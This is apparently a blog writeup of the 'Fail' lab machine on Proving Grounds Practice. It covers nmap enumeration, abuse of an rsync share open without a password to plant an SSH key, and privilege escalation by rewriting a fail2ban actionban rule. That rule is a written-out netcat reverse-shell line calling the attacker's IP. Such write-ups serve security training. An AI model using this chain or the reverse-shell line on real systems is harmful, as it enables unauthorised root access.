---
layout: single
title: Fail - Proving Grounds Practice
date: 2023-06-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-waldo/linux.png
categories:
  - provinggrounds
  - infosec
tags:
  - provinggrounds
  - linux
  - intermediate
  - rsync
  - fail2ban
---

## Linux

![](/assets/images/htb-writeup-waldo/linux.png)

This blog post is a writeup of the Fail machine from Proving Grounds Practice.

### Summary
------------------
- The server runs a Rsync service which shares a /home folder without password.
- Uploading a SSH key to this shared folder allows us to connect via SSH as fox user.
- Fox user belongs to fail2ban group so we are able to modify some config files from this service.
- Modifying /etc/fail2ban/action.d/iptables-multiform.conf and changing the actionban rule by a reverse shell line we are able to catch a reverse shell as root user.

### Detailed steps
------------------

### Enumeration

This machine has only two open ports --> 22-SSH and 873-RSYNC

I started as always just enumerating the open ports with:
```
nmap -Pn -p- 192.168.186.126
```
![nmap1](\assets\images\pg-practice-fail\1.JPG)

I found a `RSYNC` service which is a remote and local file synchronisation tool.
Nmap has a script to enumerate this service:
```
nmap -Pn -sV --script=rsync-list-modules -p 873 192.168.186.126
```
![rsync](\assets\images\pg-practice-fail\4.JPG)

As we can see in the picture, Rsync it's sharing a folder named fox.

### Explotation

In order to exploit Rsync service, I tried to connect to fox folder using netcat:
```
@RSYNCD: 31.0
fox
```
![rsync2](\assets\images\pg-practice-fail\6.JPG)

The response from Rsync was OK which means that no password is needed to connect to this folder.

I used rsync to download the folder but it was empty.
![rsync3](\assets\images\pg-practice-fail\7.JPG)

Having in count that there is a SSH service i tried to create a `SSH key` to upload to the shared folder and log in as fox user.

	1- Generating the SSH key:
	![rsync4](\assets\images\pg-practice-fail\9.JPG)
	
	2- Uploading the key to the server:
	![rsync5](\assets\images\pg-practice-fail\13.JPG)
	
	3- Connecting via SSH with our key:
	![rsync6](\assets\images\pg-practice-fail\14.JPG)

Being fox user I was able to find the user flag:
![flag1](\assets\images\pg-practice-fail\15.JPG)


### Privilege escalation

I found that fox user belongs to the `fail2ban` group.
![user](\assets\images\pg-practice-fail\16.JPG)

Fail2ban scans log files and bans IPs that show the malicious signs -- too many password failures, seeking for exploits, etc.

Belonging to fail2ban group we are able to modify some configuration files.

In /etc/fail2ban/jail.conf file I was able to find the bantime (1 minute), numer of failures (2) and how much time the server bans a host (10 minutes).
![user](\assets\images\pg-practice-fail\17.JPG)

Knowing this I decided to modify /etc/fail2ban/action.d/iptables-multiform.conf which contains the `actionban` rule.
This rule sets the action the server will take when a host is banned. 

I modified this file to open a reverse shell when a host is banned:

File permissions
![actionban](\assets\images\pg-practice-fail\18.JPG)

```
actionban = /usr/bin/nc -e /usr/bin/bash 192.168.45.240 5566
```
![actionban2](\assets\images\pg-practice-fail\19.JPG)

In order to catch the reverse shell I opened a netcat listener and tried to login via SSH to get banned.
![actionban3](\assets\images\pg-practice-fail\20.JPG)

Once I get banned from the server I was able to catch the shell as root user:
![actionban4](\assets\images\pg-practice-fail\21.JPG)

Root flag:
![actionban5](\assets\images\pg-practice-fail\22.JPG)